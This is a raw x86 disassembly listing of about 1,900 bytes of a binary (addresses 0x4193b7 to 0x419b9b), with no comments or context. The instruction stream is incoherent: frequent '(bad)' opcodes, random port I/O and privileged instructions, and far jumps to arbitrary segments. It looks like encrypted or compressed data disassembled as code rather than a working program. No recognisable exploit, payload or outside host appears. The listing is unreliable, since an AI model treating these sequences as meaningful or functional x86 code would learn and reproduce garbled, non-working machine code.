  4193b7:	adc    bh,BYTE PTR [ecx+0x325c9296]
  4193bd:	inc    ebp
  4193be:	ficom  WORD PTR [edx-0xc720331]
  4193c4:	sub    al,0x32
  4193c6:	icebp  
  4193c7:	fadd   DWORD PTR [eax]
  4193c9:	adc    DWORD PTR [ebx-0x3f],0xffffffe8
  4193cd:	xor    eax,DWORD PTR [ebx-0x341c2822]
  4193d3:	mov    cl,0x91
  4193d5:	idiv   DWORD PTR [ebp-0x16]
  4193d8:	push   esp
  4193d9:	cmp    bl,BYTE PTR [edi]
  4193db:	ins    DWORD PTR es:[edi],dx
  4193dc:	cmp    bl,dl
  4193de:	push   edi
  4193df:	dec    esi
  4193e0:	jnp    0x419422
  4193e2:	outs   dx,BYTE PTR ds:[esi]
  4193e3:	retf   0x7682
  4193e6:	sub    al,0x4c
  4193e8:	push   ebx
  4193e9:	mov    edx,0xafe370c8
  4193ee:	push   ss
  4193ef:	jmp    0x4193ad
  4193f1:	sahf   
  4193f2:	data16 (bad) 
  4193f4:	mov    ds:0x746f7dc1,eax
  4193f9:	or     DWORD PTR [eax],ebx
  4193fb:	dec    edx
  4193fc:	dec    edx
  4193fd:	stc    
  4193fe:	fdiv   DWORD PTR [eax]
  419400:	xchg   edx,eax
  419401:	sti    
  419402:	cmp    al,0x5e
  419404:	cmp    BYTE PTR [eax+0x14],bl
  419407:	loope  0x419432
  419409:	push   edi
  41940a:	pop    esi
  41940b:	dec    esi
  41940c:	add    eax,0x91ddda5b
  419411:	xor    bl,BYTE PTR [ebx+0x138aa58d]
  419417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419418:	test   DWORD PTR [ecx-0x458067e9],ebp
  41941e:	ror    BYTE PTR [eax-0x59],1
  419421:	test   DWORD PTR [esp+esi*2-0x63],edx
  419425:	or     al,0x5c
  419427:	(bad)  
  419428:	out    0x13,eax
  41942a:	jne    0x419416
  41942c:	ret    
  41942d:	stos   BYTE PTR es:[edi],al
  41942e:	imul   esi,DWORD PTR [ecx+0x7e46b9f1],0xffffff82
  419435:	mov    bh,0x25
  419437:	cmp    DWORD PTR [edx],esp
  419439:	mov    dl,0xa
  41943b:	lahf   
  41943c:	xlat   BYTE PTR ds:[ebx]
  41943d:	rep ins BYTE PTR es:[edi],dx
  41943f:	and    eax,0xaa2e0b6c
  419444:	int3   
  419445:	(bad)  
  419446:	cmp    edx,DWORD PTR [ecx+ebp*1]
  419449:	adc    eax,0x27f260ed
  41944e:	adc    ah,bh
  419450:	jmp    0x419444
  419452:	xchg   BYTE PTR [edi+0x473c5261],ah
  419458:	pop    ss
  419459:	and    eax,0x9d686cf3
  41945e:	(bad)  
  41945f:	aaa    
  419460:	(bad)  
  419461:	adc    eax,0xed0392cd
  419466:	jb     0x419453
  419468:	not    eax
  41946a:	inc    eax
  41946b:	gs inc ebx
  41946d:	in     al,dx
  41946e:	(bad)  
  41946f:	jns    0x419440
  419471:	dec    ebx
  419472:	sbb    edi,DWORD PTR [ecx+0x93d4177]
  419478:	inc    ebp
  419479:	popf   
  41947a:	or     al,0x2d
  41947c:	lods   eax,DWORD PTR ds:[esi]
  41947d:	xchg   esp,eax
  41947e:	pop    es
  41947f:	mov    ecx,0x62fbd89d
  419484:	mov    BYTE PTR ds:0x27d315e3,bh
  41948b:	push   cs
  41948c:	scas   al,BYTE PTR es:[edi]
  41948d:	xor    al,0x7f
  41948f:	dec    ebx
  419490:	jle    0x4194f9
  419492:	push   eax
  419493:	sub    ecx,edi
  419495:	sub    bl,BYTE PTR [edx-0x86d37d2]
  41949b:	sub    bl,bl
  41949d:	sub    bh,ch
  41949f:	jo     0x419463
  4194a1:	add    al,0xb6
  4194a3:	pop    ss
  4194a4:	pop    ds
  4194a5:	and    DWORD PTR [esi+0x16cf482],esp
  4194ab:	mov    al,ds:0xaa0f61ff
  4194b0:	mov    ecx,0xd9f7c859
  4194b5:	(bad)  
  4194b6:	jg     0x41949a
  4194b8:	or     eax,0xe557fa6f
  4194bd:	cmp    ecx,ecx
  4194bf:	jmp    0xb34b:0x375ad73c
  4194c6:	cmp    DWORD PTR [edx-0x2d],esp
  4194c9:	jmp    0xd14:0x7b14aa08
  4194d0:	sub    cl,BYTE PTR [eax-0x2e]
  4194d3:	or     BYTE PTR fs:0x258991cc,0x9
  4194db:	iret   
  4194dc:	stc    
  4194dd:	cli    
  4194de:	inc    ebx
  4194df:	push   esi
  4194e0:	xlat   BYTE PTR ds:[ebx]
  4194e1:	mov    ds:0x156fa3e5,al
  4194e6:	mov    WORD PTR [ecx-0x24],?
  4194e9:	pop    esp
  4194ea:	jnp    0x41948c
  4194ec:	arpl   WORD PTR [ecx],ax
  4194ee:	cld    
  4194ef:	or     eax,0xe140d734
  4194f4:	cmp    esi,esi
  4194f6:	stos   DWORD PTR es:[edi],eax
  4194f7:	jns    0x4194e3
  4194f9:	mov    edi,0x35de2eb0
  4194fe:	(bad)  
  4194ff:	mov    edx,0xcbdf984a
  419504:	jno    0x4194cd
  419506:	inc    esp
  419507:	aaa    
  419508:	adc    BYTE PTR [edi-0x78aefee6],cl
  41950e:	mov    dl,0x4b
  419510:	and    eax,0x2e34dce3
  419515:	adc    BYTE PTR [eax-0x3831c557],cl
  41951b:	rol    dh,1
  41951d:	xor    al,0x1d
  41951f:	nop
  419520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419521:	lock adc eax,0xf81ab6e7
  419527:	mov    eax,0x5bc038a8
  41952c:	rcl    BYTE PTR [esi+0x55],0x37
  419530:	sub    eax,0xa4ee15ec
  419535:	leave  
  419536:	mov    ebx,0x5768ce81
  41953b:	aaa    
  41953c:	and    eax,0xfe1f5521
  419541:	push   ds
  419542:	shr    DWORD PTR [esi+0x29],0x50
  419546:	pop    ebx
  419547:	iret   
  419548:	xchg   edx,eax
  419549:	or     dh,ah
  41954b:	fld    DWORD PTR [ecx-0x41]
  41954e:	mov    eax,0x9db2b653
  419553:	cmc    
  419554:	js     0x4195c8
  419556:	test   bh,bl
  419558:	xchg   DWORD PTR [ebx],ebx
  41955a:	mov    al,0xf1
  41955c:	inc    ebp
  41955d:	xor    DWORD PTR [esi-0x4a761215],ecx
  419563:	ss repnz test al,0x5a
  419567:	xor    al,0xfb
  419569:	mov    ch,0xd2
  41956b:	mov    ch,0x6c
  41956d:	jecxz  0x4195bf
  41956f:	add    al,BYTE PTR [edi+0x7a]
  419572:	cwde   
  419573:	out    dx,eax
  419574:	xchg   DWORD PTR [esi],eax
  419576:	jp     0x419570
  419578:	test   al,0x33
  41957a:	mov    ah,0x55
  41957c:	pop    esi
  41957d:	cli    
  41957e:	ret    0xb9d2
  419581:	xchg   edx,eax
  419582:	push   es
  419583:	in     eax,0xd9
  419585:	sbb    eax,0x5bdd1886
  41958a:	je     0x419602
  41958c:	stos   BYTE PTR es:[edi],al
  41958d:	cmp    DWORD PTR [esi-0x650409b9],edi
  419593:	mov    ebp,es
  419595:	ins    BYTE PTR es:[edi],dx
  419596:	js     0x419609
  419598:	pushf  
  419599:	into   
  41959a:	fimul  WORD PTR [ebp-0x7410d91b]
  4195a0:	jp     0x419618
  4195a2:	mov    al,ds:0x308bd117
  4195a7:	sar    BYTE PTR [esi*2-0x6841500e],1
  4195ae:	repnz dec esp
  4195b0:	jmp    0x4195c1
  4195b2:	enter  0x17a6,0x84
  4195b6:	test   BYTE PTR [edi+0x1cf5e67a],cl
  4195bc:	fild   WORD PTR [esi]
  4195be:	test   eax,0x19676734
  4195c3:	ins    BYTE PTR es:[edi],dx
  4195c4:	mov    cl,0xc4
  4195c6:	retf   0x5acb
  4195c9:	(bad)  
  4195cb:	int    0x6a
  4195cd:	fstp   DWORD PTR [esi+ecx*4+0x5a06d763]
  4195d4:	cmp    eax,0x3a704835
  4195d9:	iret   
  4195da:	mov    ecx,0xce5569ad
  4195df:	dec    edi
  4195e0:	pop    ds
  4195e1:	ficom  WORD PTR [eax-0x40e03258]
  4195e7:	push   cs
  4195e8:	dec    esi
  4195e9:	xchg   esi,eax
  4195ea:	push   ds
  4195eb:	sub    BYTE PTR [esi+0x7c2587b0],ch
  4195f1:	hlt    
  4195f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195f3:	imul   DWORD PTR [ebp+eiz*4-0xc4e346d]
  4195fa:	pop    eax
  4195fb:	jne    0x419611
  4195fd:	leave  
  4195fe:	shl    BYTE PTR [edi+0x701bf768],0x3e
  419605:	mov    ebx,DWORD PTR [edi-0x49]
  419608:	sub    DWORD PTR [ebx-0x2a],edx
  41960b:	jg     0x419680
  41960d:	dec    esi
  41960e:	xchg   ebx,eax
  41960f:	cs lock in eax,dx
  419612:	pop    edx
  419613:	push   edi
  419614:	cmp    al,0xd7
  419616:	ror    edx,0xe5
  419619:	iret   
  41961a:	xor    esp,DWORD PTR [esi-0x669d634b]
  419620:	sub    eax,0xaeb8e535
  419625:	add    ecx,edi
  419627:	dec    ebx
  419628:	xor    DWORD PTR [esi+0x3449e3d],eax
  41962e:	xchg   ebp,eax
  41962f:	add    DWORD PTR [ebx],0x2d
  419632:	adc    ch,cl
  419634:	pop    edi
  419635:	or     BYTE PTR ds:0x5c26e2bd,0xc7
  41963c:	arpl   WORD PTR [edi+0x6b],ax
  41963f:	or     esi,DWORD PTR [ebx]
  419641:	aam    0x6
  419643:	push   0xffffff92
  419645:	xor    esi,DWORD PTR [ebp+0x18]
  419648:	(bad)  
  41964a:	int    0x2a
  41964c:	pop    ebx
  41964d:	dec    edx
  41964e:	rol    bl,1
  419650:	ins    DWORD PTR es:[edi],dx
  419651:	sub    ch,cl
  419653:	lods   al,BYTE PTR ds:[esi]
  419654:	jmp    0x4db7:0x42e57e2a
  41965b:	imul   ebx,DWORD PTR [ecx+0x5e9835],0xffffff91
  419662:	xchg   esp,eax
  419663:	push   ds
  419664:	int    0x7b
  419666:	or     ebp,esi
  419668:	sub    DWORD PTR [edi+0x43],eax
  41966b:	scas   eax,DWORD PTR es:[edi]
  41966c:	inc    edx
  41966d:	enter  0x9ae0,0x9f
  419671:	inc    esp
  419672:	mov    eax,0xf16cfa9a
  419677:	stc    
  419678:	(bad)  
  419679:	sar    BYTE PTR [esi],cl
  41967b:	sar    dh,1
  41967d:	sbb    BYTE PTR [edx-0x383be285],dl
  419683:	xlat   BYTE PTR ds:[ebx]
  419684:	test   ah,ah
  419686:	(bad)  
  419687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419688:	ins    DWORD PTR es:[edi],dx
  419689:	in     eax,0x1a
  41968b:	int    0xa1
  41968d:	mov    al,ds:0xb4ad8934
  419692:	aam    0x7f
  419694:	ror    BYTE PTR cs:[eax+ebx*1+0x4f],cl
  419699:	fild   DWORD PTR [edi]
  41969b:	push   cs
  41969c:	lods   eax,DWORD PTR ds:[esi]
  41969d:	imul   edi,DWORD PTR [esi+0x57],0x7fe7b4f0
  4196a4:	js     0x419720
  4196a6:	(bad)  
  4196a7:	push   esp
  4196a8:	push   esi
  4196a9:	add    BYTE PTR [edi],ah
  4196ab:	loope  0x41963a
  4196ad:	push   edi
  4196ae:	daa    
  4196af:	enter  0xef57,0x1f
  4196b3:	ret    
  4196b4:	adc    BYTE PTR [eax],dh
  4196b6:	xor    eax,0x78ced699
  4196bb:	jg     0x4196e7
  4196bd:	pop    edx
  4196be:	xor    al,0x75
  4196c0:	cmp    DWORD PTR [edx+0x66],esp
  4196c3:	cwde   
  4196c4:	inc    esi
  4196c5:	xor    bh,BYTE PTR [eax]
  4196c7:	add    eax,0x5cf05ff3
  4196cc:	inc    esi
  4196cd:	xor    eax,0xefd1cfda
  4196d2:	lock and DWORD PTR [edx-0x7e],edi
  4196d6:	push   edi
  4196d7:	mov    eax,ds:0xe17e51b1
  4196dc:	mov    ebp,0x4be41a20
  4196e1:	in     al,0x96
  4196e3:	jns    0x419677
  4196e5:	inc    edi
  4196e6:	push   0xd2700c1c
  4196eb:	jnp    0x419764
  4196ed:	sbb    al,BYTE PTR [ecx+0x31b3f371]
  4196f3:	add    ecx,DWORD PTR [edi+0x52]
  4196f6:	scas   eax,DWORD PTR es:[edi]
  4196f7:	push   ecx
  4196f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196f9:	jnp    0x4196ff
  4196fb:	stos   BYTE PTR es:[edi],al
  4196fc:	xchg   BYTE PTR [edx],dh
  4196fe:	imul   eax,DWORD PTR [esi+0x6e2df464],0xffffffa9
  419705:	xchg   DWORD PTR [edx-0x7ce6839a],esp
  41970b:	hlt    
  41970c:	mov    cl,0x51
  41970e:	mov    edi,0x4548df87
  419713:	mov    esi,0x7570e761
  419718:	mov    esi,0xb619cdbe
  41971d:	xchg   BYTE PTR [ebp-0x2d],cl
  419720:	mov    es,WORD PTR [eax+0x244be886]
  419726:	mov    dl,0x4c
  419728:	dec    ebx
  419729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41972a:	sub    edx,esi
  41972c:	cmp    BYTE PTR [ecx+edi*2+0x41b380fb],0x31
  419734:	xchg   DWORD PTR [ebp-0x26],ebx
  419737:	ins    BYTE PTR es:[edi],dx
  419738:	push   ebp
  419739:	pop    edi
  41973a:	gs and dl,bh
  41973d:	sbb    DWORD PTR [ebp-0x24c24048],edi
  419743:	add    eax,0x475e933a
  419748:	cmp    BYTE PTR [edi],ah
  41974a:	and    DWORD PTR [ebp+eax*8+0x443b3cf4],esp
  419751:	out    dx,al
  419752:	xchg   DWORD PTR ds:[edi+0x531861c2],esi
  419759:	push   ebx
  41975a:	fistp  QWORD PTR [ecx+0x4897debd]
  419760:	out    dx,eax
  419761:	or     bl,BYTE PTR [esi-0x2d]
  419764:	adc    eax,0x34e7c315
  419769:	int3   
  41976a:	cs push 0xffffffbc
  41976d:	mov    al,ds:0xc8443004
  419772:	test   al,0xcd
  419774:	mov    WORD PTR [eax+0x6f],?
  419777:	dec    ecx
  419778:	sbb    DWORD PTR [eax+ebx*8+0x7573a467],0xeb933947
  419783:	or     al,0x81
  419785:	mov    ebx,0xe585cf02
  41978a:	xor    DWORD PTR [esi+0x4bbb06ff],esp
  419790:	mov    BYTE PTR [ebx+eax*1-0x36],dh
  419794:	fwait
  419795:	(bad)  
  419796:	mov    edx,0xdcf58eb1
  41979b:	pop    esi
  41979c:	test   al,0xc0
  41979f:	mov    eax,ds:0x648185a6
  4197a4:	jl     0x419762
  4197a6:	and    eax,DWORD PTR cs:[edi+0x6f5cf4c3]
  4197ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197ae:	addr16 dec edi
  4197b0:	xchg   edi,eax
  4197b1:	pop    edx
  4197b2:	out    dx,eax
  4197b3:	or     bl,bh
  4197b5:	mov    DWORD PTR [ebx+0x104ebe69],esp
  4197bb:	xchg   esi,eax
  4197bc:	(bad)  
  4197bd:	sub    cl,BYTE PTR [ecx-0x637875c9]
  4197c3:	xchg   edi,eax
  4197c4:	inc    eax
  4197c5:	and    al,0x51
  4197c7:	mov    eax,ds:0x1c83902a
  4197cc:	cmp    BYTE PTR ds:0x8fba5a84,dh
  4197d2:	xchg   BYTE PTR [edx+0x2a5c22ef],ah
  4197d8:	fwait
  4197d9:	jl     0x4197f7
  4197db:	ins    BYTE PTR es:[edi],dx
  4197dc:	sbb    ebp,DWORD PTR [ebx+0x115d5352]
  4197e2:	inc    DWORD PTR [edx-0x7e]
  4197e5:	sti    
  4197e6:	adc    al,0xb9
  4197e8:	push   ebx
  4197e9:	jmp    0x5678:0x79d12e42
  4197f0:	fstp   TBYTE PTR [edi]
  4197f2:	dec    ebx
  4197f3:	imul   ebp,DWORD PTR [ebp-0x60658428],0xaa738b79
  4197fd:	shl    esi,1
  4197ff:	outs   dx,DWORD PTR ds:[esi]
  419800:	adc    BYTE PTR [esi-0x7c],0xbe
  419804:	sbb    al,dh
  419806:	loope  0x4197dd
  419808:	or     DWORD PTR [edi],eax
  41980a:	jmp    0x5e7b:0xaaba6d85
  419811:	sub    BYTE PTR ss:[esi],ch
  419814:	adc    ecx,ebp
  419816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419817:	pop    ebx
  419818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419819:	jae    0x41986c
  41981b:	(bad)  
  41981c:	add    al,0x30
  41981e:	(bad)  
  41981f:	sbb    edi,ebp
  419821:	mov    esi,0x54bb4f8
  419826:	jle    0x41980f
  419828:	jmp    DWORD PTR [ecx-0x752f3bbd]
  41982e:	sbb    esp,0x62
  419831:	jmp    0x47a436cc
  419836:	ret    
  419837:	test   DWORD PTR [eax+0x29a7bb3d],eax
  41983d:	jns    0x4198bb
  41983f:	push   edx
  419840:	repnz push es
  419842:	push   esp
  419843:	xor    bl,BYTE PTR [ebx]
  419845:	mov    eax,ds:0xc15d3189
  41984a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41984b:	sub    BYTE PTR [eax-0x3b],cl
  41984e:	stos   BYTE PTR es:[edi],al
  41984f:	test   BYTE PTR [esi+0x15b32219],al
  419855:	inc    edi
  419856:	push   edx
  419857:	daa    
  419858:	mov    al,ds:0xef7b5fa4
  41985d:	or     ebx,DWORD PTR [edi+eiz*4-0x50]
  419861:	out    0x2e,eax
  419863:	js     0x4198bf
  419865:	xor    bl,bh
  419867:	cmp    eax,0x35ab84a4
  41986c:	cmp    eax,edi
  41986e:	pop    edx
  41986f:	dec    ecx
  419870:	and    bh,dh
  419872:	repz xchg edi,eax
  419874:	cmp    BYTE PTR [edi],0xb1
  419877:	adc    BYTE PTR [edi+ebx*1],cl
  41987a:	retf   
  41987b:	and    al,0xf8
  41987d:	xchg   ebx,eax
  41987e:	rcr    DWORD PTR [ecx+0x3f],cl
  419881:	bound  ecx,QWORD PTR [edi]
  419883:	jmp    0xac68:0xd67cd3c5
  41988a:	push   es
  41988b:	add    BYTE PTR [ecx+0x6fd493e0],dh
  419891:	out    dx,eax
  419892:	cmp    BYTE PTR [ecx],ch
  419894:	xchg   edx,eax
  419895:	jnp    0x4198f8
  419897:	aad    0x82
  419899:	(bad)  
  41989a:	and    dl,BYTE PTR [ebp+ecx*1-0x1f]
  41989e:	lds    esi,FWORD PTR [esi+0x6c]
  4198a1:	xchg   ecx,eax
  4198a2:	mov    cl,0x74
  4198a4:	push   esi
  4198a5:	cmp    ah,BYTE PTR [edi+0x4]
  4198a8:	sub    al,bl
  4198aa:	addr16 sub al,0x25
  4198ad:	loopne 0x4198b5
  4198af:	shl    DWORD PTR [edi+edi*4-0x3e],1
  4198b3:	mov    eax,0x44d4d0a1
  4198b8:	and    BYTE PTR [edi+ecx*1-0x4e89c4d],dl
  4198bf:	mov    edx,0xdb8183d0
  4198c4:	test   al,0xf
  4198c7:	mov    esi,0x93be269d
  4198cc:	add    DWORD PTR [ecx+0x7a],esi
  4198cf:	test   BYTE PTR [ecx+0x7c],ch
  4198d2:	sbb    BYTE PTR [ebp+0x4d4e0fa],dl
  4198d8:	call   0x3962cd63
  4198dd:	add    edx,ebp
  4198df:	lods   eax,DWORD PTR ds:[esi]
  4198e0:	adc    al,0xa0
  4198e2:	add    ah,BYTE PTR [ebp-0x4a]
  4198e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198e6:	mov    eax,ds:0xa3416d75
  4198eb:	iret   
  4198ec:	scas   al,BYTE PTR es:[edi]
  4198ed:	xchg   ecx,eax
  4198ee:	shl    BYTE PTR [esp+edi*1-0x583526a],cl
  4198f5:	loopne 0x419967
  4198f7:	dec    esi
  4198f8:	sbb    BYTE PTR [edx],bl
  4198fa:	push   ds
  4198fb:	xchg   esp,eax
  4198fc:	int3   
  4198fd:	lods   eax,DWORD PTR ds:[esi]
  4198fe:	sub    al,0x4e
  419900:	repz push ds
  419902:	sbb    eax,DWORD PTR [eax+0x1d9441b7]
  419908:	(bad)  
  419909:	fcom   DWORD PTR [eax]
  41990b:	sub    al,0x7c
  41990d:	xchg   ebx,eax
  41990e:	xchg   edx,eax
  41990f:	push   ss
  419910:	fimul  WORD PTR [edi+edx*8+0x5d]
  419914:	out    dx,eax
  419915:	jmp    0x77ed85aa
  41991a:	or     DWORD PTR [edi],edx
  41991c:	mov    esi,edx
  41991e:	mov    bh,0x95
  419920:	lds    ecx,FWORD PTR [ebp+0x548eed12]
  419926:	and    DWORD PTR [edx],ebx
  419928:	mov    esp,0xf152471e
  41992d:	xor    al,0xd6
  41992f:	mov    bl,0xac
  419931:	ja     0x4198e1
  419933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419934:	cmp    DWORD PTR [edi+0x2531940f],0x8a159bc9
  41993e:	mov    edi,0x4ac3a275
  419943:	in     eax,0xfb
  419945:	ficomp WORD PTR [ebp-0x7dc250de]
  41994b:	inc    edx
  41994c:	(bad)  
  41994d:	in     al,0xf2
  41994f:	fdivp  st(1),st
  419951:	cmp    ch,BYTE PTR [eax]
  419953:	add    al,0xbb
  419955:	les    esp,FWORD PTR [ecx]
  419957:	sahf   
  419958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419959:	pop    ss
  41995a:	cmp    DWORD PTR [ecx-0x5c],ebx
  41995d:	sbb    eax,0x81603a4d
  419962:	xchg   DWORD PTR [esi+ecx*1+0x29bff20b],ebx
  419969:	in     eax,dx
  41996a:	mov    DWORD PTR [esp+ecx*8+0x3a],esi
  41996e:	lock shl BYTE PTR [eax],1
  419971:	xchg   edx,eax
  419972:	cmc    
  419973:	jns    0x41997c
  419975:	cld    
  419976:	mov    ebp,DWORD PTR [ecx+ecx*4-0x5aa0a6c9]
  41997d:	call   0xeb4e:0x367744ab
  419984:	or     DWORD PTR [ebp+edx*8+0x49eb6dc2],edi
  41998b:	sub    DWORD PTR [edi],edi
  41998d:	in     al,dx
  41998e:	out    dx,ax
  419990:	sub    BYTE PTR [edi-0x4121f818],0x55
  419997:	sti    
  419998:	fistp  WORD PTR [ecx-0x5e]
  41999b:	cwde   
  41999c:	xchg   ebp,eax
  41999d:	test   eax,0xea7117bb
  4199a2:	stos   BYTE PTR es:[edi],al
  4199a3:	das    
  4199a4:	add    eax,0x5a5c1e64
  4199a9:	(bad)  
  4199aa:	pop    ebp
  4199ab:	mov    dl,0xfd
  4199ad:	dec    esp
  4199ae:	mov    esi,0x126377e3
  4199b3:	xlat   BYTE PTR ds:[ebx]
  4199b4:	stos   DWORD PTR es:[edi],eax
  4199b5:	(bad)  
  4199b6:	ret    
  4199b7:	rol    BYTE PTR [esi],cl
  4199b9:	mov    dl,0x20
  4199bb:	adc    edx,DWORD PTR [ebx+0x45]
  4199be:	nop
  4199bf:	and    BYTE PTR [ebx+0x66],cl
  4199c2:	scas   al,BYTE PTR es:[edi]
  4199c3:	fidiv  DWORD PTR [eax-0x47]
  4199c6:	int    0xfb
  4199c8:	sbb    BYTE PTR [edx-0x5aa06035],bh
  4199ce:	(bad)  
  4199cf:	pop    edx
  4199d0:	cmp    edx,ebp
  4199d2:	loop   0x4199c3
  4199d4:	cmp    ch,BYTE PTR [esp+edi*4]
  4199d7:	cmp    dl,al
  4199d9:	pop    ecx
  4199da:	mov    WORD PTR [ebp+esi*4+0x7f36ef33],fs
  4199e1:	jle    0x41996a
  4199e3:	stos   DWORD PTR es:[edi],eax
  4199e4:	test   BYTE PTR [eax],dl
  4199e6:	aad    0xd3
  4199e8:	dec    ebx
  4199e9:	imul   esi,DWORD PTR [ecx],0x903ecbd4
  4199ef:	stos   BYTE PTR es:[edi],al
  4199f0:	cmp    edx,DWORD PTR [ebx+0x26]
  4199f3:	inc    ebp
  4199f4:	cmp    al,0xa
  4199f6:	lds    ecx,FWORD PTR [edi-0x58]
  4199f9:	mov    eax,ds:0xdc6e0701
  4199fe:	pop    esp
  4199ff:	and    al,0x4b
  419a01:	inc    esi
  419a02:	jb     0x419999
  419a04:	pop    esp
  419a05:	nop
  419a06:	lock add eax,0xa7a9ca99
  419a0c:	adc    al,0x71
  419a0e:	xchg   esi,eax
  419a0f:	sub    al,bl
  419a11:	into   
  419a12:	pop    ebx
  419a13:	iret   
  419a14:	pop    esi
  419a15:	out    0x10,eax
  419a17:	lock inc ebx
  419a19:	clc    
  419a1a:	cmp    ebp,DWORD PTR ds:0xc2249504
  419a20:	in     eax,0xe1
  419a22:	pmulhw mm5,QWORD PTR [edx-0x2f5530c8]
  419a29:	cmp    ebp,ecx
  419a2b:	jno    0x419a3a
  419a2d:	frstor [esi]
  419a2f:	pop    es
  419a30:	pop    ss
  419a31:	pop    esp
  419a32:	inc    edi
  419a33:	mov    bl,0x97
  419a36:	fidivr DWORD PTR ds:0x44a3f32b
  419a3c:	xor    edi,DWORD PTR [edx+eax*8]
  419a3f:	dec    esi
  419a40:	fld    DWORD PTR [ebx+0x6c2a083e]
  419a46:	mov    ah,0xa1
  419a48:	out    0x74,al
  419a4a:	jo     0x419a3f
  419a4c:	aas    
  419a4d:	and    cl,dh
  419a4f:	mov    ah,0x34
  419a51:	ds sub al,0x52
  419a54:	inc    ebx
  419a55:	sub    al,0x76
  419a57:	(bad)  
  419a58:	das    
  419a59:	mov    edi,0x13c23e84
  419a5e:	mov    esp,0xbe4b1a3e
  419a63:	fadd   st(4),st
  419a65:	leave  
  419a66:	mov    DWORD PTR [ebp+ebx*2+0x28],edx
  419a6a:	lock add DWORD PTR [edi-0x3c],ebp
  419a6e:	sbb    ah,ah
  419a70:	in     eax,dx
  419a71:	loopne 0x419ab3
  419a73:	pop    ebp
  419a74:	into   
  419a75:	cmp    DWORD PTR [ebx],0x2cf4a98e
  419a7b:	rcr    BYTE PTR [eax+eax*4+0x3c],cl
  419a7f:	sahf   
  419a80:	not    DWORD PTR [edx]
  419a82:	fucom  st(4)
  419a84:	pop    edx
  419a85:	xor    ebp,edx
  419a87:	push   esp
  419a88:	mov    ds:0xb4318ac5,eax
  419a8d:	ja     0x419a33
  419a8f:	(bad)  
  419a90:	jle    0x419aba
  419a92:	fild   DWORD PTR [ebx+esi*4+0x3a]
  419a96:	dec    ebx
  419a97:	sbb    eax,0x776da62a
  419a9c:	inc    esp
  419a9d:	push   0x6a
  419a9f:	or     eax,0x79393f95
  419aa4:	mov    esp,0x9bb87f74
  419aa9:	fs or  edx,edi
  419aac:	cwde   
  419aad:	xor    esi,DWORD PTR [eax+ecx*2]
  419ab0:	mov    al,ds:0x196e02af
  419ab5:	aaa    
  419ab6:	inc    di
  419ab8:	outs   dx,BYTE PTR ds:[esi]
  419ab9:	enter  0xd838,0x93
  419abd:	sbb    bh,BYTE PTR [edi+0x1f43d710]
  419ac3:	sbb    eax,0x10bb69cb
  419ac8:	aam    0x3
  419aca:	loope  0x419af1
  419acc:	mov    edx,DWORD PTR [eax-0x41ad73c1]
  419ad2:	(bad)  
  419ad3:	pushf  
  419ad4:	stc    
  419ad5:	popa   
  419ad6:	fld    QWORD PTR [ecx+ecx*8]
  419ad9:	bound  edi,QWORD PTR [eax+edx*8+0x5f26da00]
  419ae0:	out    dx,eax
  419ae1:	and    al,0x6e
  419ae3:	push   ebx
  419ae4:	sbb    al,0x73
  419ae6:	lods   eax,DWORD PTR ds:[esi]
  419ae7:	xor    al,0x4e
  419ae9:	push   0x59a78ace
  419aee:	sbb    bl,al
  419af0:	outs   dx,BYTE PTR ds:[esi]
  419af1:	jmp    0x25c8:0x2c13bca2
  419af8:	xchg   esp,eax
  419af9:	mov    eax,ds:0x11e9e587
  419afe:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b01:	fild   DWORD PTR [ebp+edx*2+0x7997d301]
  419b08:	dec    ecx
  419b09:	pop    ss
  419b0a:	sub    dh,BYTE PTR [esi]
  419b0c:	fs int3 
  419b0e:	jns    0x419b0d
  419b10:	arpl   WORD PTR [edi+0x2d2aa983],sp
  419b16:	sbb    cl,cl
  419b18:	std    
  419b19:	dec    ebp
  419b1a:	ret    
  419b1b:	shr    DWORD PTR [esi],cl
  419b1d:	mov    ebp,DWORD PTR [ecx+eax*8-0x3814e2b2]
  419b24:	dec    ebx
  419b25:	loope  0x419ac6
  419b27:	jnp    0x419b2b
  419b29:	data16 test al,0xac
  419b2c:	pop    ecx
  419b2d:	ins    BYTE PTR es:[edi],dx
  419b2e:	inc    esp
  419b2f:	(bad)  
  419b30:	adc    DWORD PTR [esp+ebx*8-0x4c200613],esp
  419b37:	cmp    al,0xe0
  419b39:	push   ebp
  419b3a:	and    ecx,esp
  419b3c:	loope  0x419b38
  419b3e:	sbb    eax,0x3025e5ce
  419b43:	outs   dx,DWORD PTR ds:[esi]
  419b44:	pop    esp
  419b45:	in     al,dx
  419b46:	sbb    ebp,DWORD PTR [edx+0x3b44376]
  419b4c:	out    0x5d,eax
  419b4e:	sti    
  419b4f:	mov    esi,0xd0fe83a8
  419b54:	ret    
  419b55:	ret    
  419b56:	jae    0x419b4a
  419b58:	movntps XMMWORD PTR [eax-0x4f71e3b8],xmm0
  419b5f:	mov    DWORD PTR [edi-0x7e],esp
  419b62:	adc    BYTE PTR [ecx+0x72dc5b68],al
  419b68:	std    
  419b69:	and    al,0xc4
  419b6b:	lea    ecx,[ecx]
  419b6d:	fisub  DWORD PTR ss:[edx]
  419b70:	ins    DWORD PTR es:[edi],dx
  419b71:	sbb    edi,ecx
  419b73:	out    0x50,al
  419b75:	ret    0xdc5c
  419b78:	xor    eax,0x4f6c43c7
  419b7d:	mov    dl,0x36
  419b7f:	jbe    0x419beb
  419b81:	sub    DWORD PTR [esi+ecx*8+0x34],edi
  419b85:	leave  
  419b86:	rcl    ebx,0x55
  419b89:	sbb    DWORD PTR [esi-0x135cb389],esi
  419b8f:	sbb    dl,dl
  419b91:	lahf   
  419b92:	call   0x2b16:0xb95d2caa
  419b99:	mov    al,0xda
  419b9b:	pop    ebp
